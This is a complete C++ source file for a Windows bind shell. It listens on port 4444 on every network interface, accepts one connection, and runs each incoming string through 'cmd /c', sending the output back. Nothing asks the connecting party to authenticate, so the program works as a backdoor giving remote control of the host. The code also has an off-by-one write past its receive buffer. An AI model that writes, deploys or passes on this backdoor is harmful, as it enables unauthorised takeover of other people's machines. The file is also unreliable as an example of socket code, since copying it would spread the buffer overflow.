#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>
#include <sstream>
#include <cstdlib>

#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable : 4996)

int main() {
    WSADATA wsaData;
    SOCKET listenSocket = INVALID_SOCKET;
    SOCKET clientSocket = INVALID_SOCKET;
    sockaddr_in serverAddr;
    sockaddr_in clientAddr;
    int clientLen = sizeof(clientAddr);

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock." << std::endl;
        return 1;
    }

    // Create a socket
    listenSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (listenSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed." << std::endl;
        WSACleanup();
        return 1;
    }

    // Setup the server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(4444); // Port to listen on
    serverAddr.sin_addr.s_addr = INADDR_ANY; // Listen on all interfaces

    // Bind the socket
    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Bind failed." << std::endl;
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    // Start listening
    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "Listen failed." << std::endl;
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "Listening on port 4444..." << std::endl;

    // Accept a connection
    clientSocket = accept(listenSocket, (sockaddr*)&clientAddr, &clientLen);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Accept failed." << std::endl;
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "Connection accepted." << std::endl;

    char buffer[1024];
    while (true) {
        // Receive command
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived <= 0) {
            std::cerr << "Connection closed." << std::endl;
            break;
        }

        buffer[bytesReceived] = '\0';
        std::string command = buffer;

        if (command == "exit") {
            std::cout << "Exiting..." << std::endl;
            break;
        }

        // Execute command
        std::string cmd = "cmd /c " + command;
        FILE* pipe = _popen(cmd.c_str(), "r");
        if (!pipe) {
            std::cerr << "Failed to run command." << std::endl;
            continue;
        }

        // Read output
        char output[1024];
        std::string result;
        while (fgets(output, sizeof(output), pipe) != nullptr) {
            result += output;
        }

        _pclose(pipe);

        // Send result back to client
        send(clientSocket, result.c_str(), result.size(), 0);
    }

    // Close the sockets and cleanup
    closesocket(clientSocket);
    closesocket(listenSocket);
    WSACleanup();

    return 0;
}
